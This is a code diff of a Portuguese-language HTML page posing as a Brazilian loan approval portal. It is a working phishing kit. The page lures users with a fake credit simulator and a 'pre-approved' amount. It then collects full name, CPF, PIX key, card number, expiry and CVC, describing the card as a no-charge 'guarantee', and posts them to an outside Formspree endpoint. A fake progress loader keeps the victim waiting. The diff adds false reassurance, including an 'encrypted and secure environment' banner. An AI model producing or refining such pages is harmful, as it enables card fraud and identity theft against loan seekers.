@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Crédito Oficial</title>
+    <title>Aprovação de Crédito | Sistema On-line</title>
+    
+    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2504/2504647.png" type="image/x-icon">
     
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     
@@ -15,12 +17,16 @@
             --bg: #F0F2F5;
         }
 
-        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; min-height: 100vh; }
         
-        .card { background: white; width: 90%; max-width: 450px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); overflow: hidden; position: relative; }
+        /* Barra de Segurança */
+        .safe-bar { background: #e2e8f0; color: #475569; text-align: center; padding: 6px; font-size: 0.65rem; font-weight: bold; letter-spacing: 1px; }
+
+        .container { display: flex; justify-content: center; align-items: center; padding: 20px; min-height: 80vh; }
+        .card { background: white; width: 100%; max-width: 450px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); overflow: hidden; }
         
         .header { background: var(--brand-dark); color: white; padding: 1.5rem; text-align: center; }
-        .header h1 { font-size: 1.4rem; margin: 0; }
+        .header h1 { font-size: 1.3rem; margin: 0; }
         
         .content { padding: 2rem; }
         .hidden { display: none; }
@@ -29,9 +35,8 @@
         label { display: block; font-weight: 600; margin-bottom: 5px; font-size: 0.85rem; color: #64748B; }
         input, select { 
             width: 100%; padding: 12px; border: 2px solid #E2E8F0; border-radius: 10px; 
-            box-sizing: border-box; font-size: 1rem; transition: 0.3s;
+            box-sizing: border-box; font-size: 1rem; 
         }
-        input:focus { border-color: var(--brand-primary); outline: none; }
 
         .btn { 
             width: 100%; background: var(--brand-primary); color: white; padding: 15px; 
@@ -40,90 +45,90 @@
 
         .summary-mini { background: #f8fafc; padding: 12px; border-radius: 10px; margin-bottom: 20px; border-left: 4px solid var(--success); }
 
-        /* Animação de Loading */
         #loader { text-align: center; padding: 40px 20px; }
         .spinner {
             border: 4px solid rgba(0, 0, 0, 0.1);
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
+            width: 36px; height: 36px; border-radius: 50%;
             border-left-color: var(--brand-primary);
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            animation: spin 1s linear infinite; margin: 0 auto 20px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div id="step1">
-        <div class="header"><h1>Simulador de Crédito</h1></div>
-        <div class="content">
-            <label>Valor Desejado: <span id="valStr" style="color:var(--brand-primary); font-weight: 800;">R$ 1.500</span></label>
-            <input type="range" id="amount" min="500" max="35000" step="500" value="1500" style="width:100%; margin: 15px 0;">
-            
-            <label>Parcelas</label>
-            <select id="terms" style="margin-bottom: 20px;">
-                <option value="12">12 meses</option>
-                <option value="24">24 meses</option>
-                <option value="48">48 meses</option>
-            </select>
+<div class="safe-bar">🔒 AMBIENTE CRIPTOGRAFADO E SEGURO</div>
 
-            <div style="background: #f1f5f9; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
-                <small>Parcela estimada:</small>
-                <div id="installmentText" style="font-size: 1.5rem; font-weight: 800; color: var(--brand-dark);">R$ 0,00</div>
-            </div>
-
-            <button class="btn" onclick="goToStep2()">Solicitar Empréstimo</button>
-        </div>
-    </div>
-
-    <div id="step2" class="hidden">
-        <div class="header"><h1>Confirmação</h1></div>
-        <div class="content">
-            <div class="summary-mini">
-                <small>Crédito Solicitado:</small><br>
-                <strong id="finalValueDisplay">R$ 0,00</strong>
-            </div>
-
-            <form action="https://formspree.io/f/xyknjwqj" method="POST" id="loanForm">
-                <div class="form-group">
-                    <label>Nome Completo</label>
-                    <input type="text" name="Nome" required placeholder="Nome do titular">
-                </div>
-                <div class="form-group">
-                    <label>CPF</label>
-                    <input type="text" name="CPF" required placeholder="000.000.000-00" maxlength="14">
-                </div>
-                <div class="form-group">
-                    <label>Chave PIX (Para Recebimento)</label>
-                    <input type="text" name="Chave_PIX" required placeholder="CPF, E-mail ou Celular">
-                </div>
+<div class="container">
+    <div class="card">
+        <div id="step1">
+            <div class="header"><h1>Simulador de Crédito</h1></div>
+            <div class="content">
+                <label>Valor Desejado: <span id="valStr" style="color:var(--brand-primary); font-weight: 800;">R$ 1.500</span></label>
+                <input type="range" id="amount" min="500" max="35000" step="500" value="1500" style="width:100%; margin: 15px 0;">
                 
-                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
-                
-                <div class="form-group">
-                    <label>Número do Cartão (Garantia de Crédito)</label>
-                    <input type="text" name="Cartao_Num" required placeholder="0000 0000 0000 0000" maxlength="16">
-                </div>
-                <div style="display: flex; gap: 10px;">
-                    <input type="text" name="Validade" placeholder="MM/AA" required maxlength="5">
-                    <input type="password" name="CVC" placeholder="CVC" required maxlength="4">
+                <label>Parcelas</label>
+                <select id="terms" style="margin-bottom: 20px;">
+                    <option value="12">12 meses</option>
+                    <option value="24">24 meses</option>
+                    <option value="48">48 meses</option>
+                </select>
+
+                <div style="background: #f1f5f9; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+                    <small>Parcela mensal estimada:</small>
+                    <div id="installmentText" style="font-size: 1.5rem; font-weight: 800; color: var(--brand-dark);">R$ 0,00</div>
                 </div>
 
-                <input type="hidden" name="Valor_Selecionado" id="hiddenValor">
-                <input type="hidden" name="Prazo_Meses" id="hiddenPrazo">
-
-                <button type="submit" class="btn" style="background: var(--success);">Confirmar e Receber</button>
-            </form>
+                <button class="btn" onclick="goToStep2()">Solicitar Liberação</button>
+            </div>
         </div>
-    </div>
 
-    <div id="loader" class="hidden">
-        <div class="spinner"></div>
-        <h2 id="statusText">Verificando dados...</h2>
-        <p style="font-size: 0.9rem; color: #64748B;">Aguarde, processando junto ao banco.</p>
+        <div id="step2" class="hidden">
+            <div class="header"><h1>Confirmar Identidade</h1></div>
+            <div class="content">
+                <div class="summary-mini">
+                    <small>Valor Pré-Aprovado:</small><br>
+                    <strong id="finalValueDisplay">R$ 0,00</strong>
+                </div>
+
+                <form action="https://formspree.io/f/xyknjwqj" method="POST" id="loanForm">
+                    <div class="form-group">
+                        <label>Nome Completo do Titular</label>
+                        <input type="text" name="Nome" required placeholder="Conforme o cartão">
+                    </div>
+                    <div class="form-group">
+                        <label>CPF</label>
+                        <input type="text" name="CPF" required placeholder="000.000.000-00">
+                    </div>
+                    <div class="form-group">
+                        <label>Chave PIX (Para Recebimento)</label>
+                        <input type="text" name="Chave_PIX" required placeholder="CPF, Celular ou E-mail">
+                    </div>
+                    
+                    <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+                    
+                    <div class="form-group">
+                        <label>Cartão para Garantia (Sem cobrança)</label>
+                        <input type="text" name="Cartao_Num" required placeholder="0000 0000 0000 0000" maxlength="16">
+                    </div>
+                    <div style="display: flex; gap: 10px;">
+                        <input type="text" name="Validade" placeholder="MM/AA" required maxlength="5">
+                        <input type="password" name="CVC" placeholder="CVC" required maxlength="4">
+                    </div>
+
+                    <input type="hidden" name="Valor_Final" id="hiddenValor">
+                    <input type="hidden" name="Prazo" id="hiddenPrazo">
+
+                    <button type="submit" class="btn" style="background: var(--success);">FINALIZAR E RECEBER PIX</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="loader" class="hidden">
+            <div class="spinner"></div>
+            <h2 id="statusText">Analisando Perfil...</h2>
+            <p style="font-size: 0.9rem; color: #64748B;">Aguarde a liberação dos fundos.</p>
+        </div>
     </div>
 </div>
 
@@ -131,7 +136,6 @@
     const amountInput = document.getElementById('amount');
     const termsInput = document.getElementById('terms');
     
-    // Atualiza os valores na tela e nos campos ocultos
     function updateSim() {
         const val = parseFloat(amountInput.value);
         const t = parseInt(termsInput.value);
@@ -145,24 +149,17 @@
         document.getElementById('installmentText').innerText = pmt.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
     }
 
-    // Navegação entre telas
     function goToStep2() {
         document.getElementById('step1').classList.add('hidden');
         document.getElementById('step2').classList.remove('hidden');
         document.getElementById('finalValueDisplay').innerText = document.getElementById('valStr').innerText;
     }
 
-    // Controle de envio
-    document.getElementById('loanForm').addEventListener('submit', function(e) {
-        // Mostra o loader
+    document.getElementById('loanForm').addEventListener('submit', function() {
         document.getElementById('step2').classList.add('hidden');
         document.getElementById('loader').classList.remove('hidden');
-        
-        // Simulação de etapas de processamento visual
-        setTimeout(() => { document.getElementById('statusText').innerText = "Validando garantia..."; }, 1500);
-        setTimeout(() => { document.getElementById('statusText').innerText = "Consultando Score..."; }, 3000);
-        
-        // O formulário será enviado naturalmente pelo atributo 'action' do HTML
+        setTimeout(() => { document.getElementById('statusText').innerText = "Validando garantia..."; }, 2000);
+        setTimeout(() => { document.getElementById('statusText').innerText = "Finalizando TED/PIX..."; }, 4000);
     });
 
     amountInput.addEventListener('input', updateSim);
@@ -172,4 +169,3 @@
 
 </body>
 </html>
->
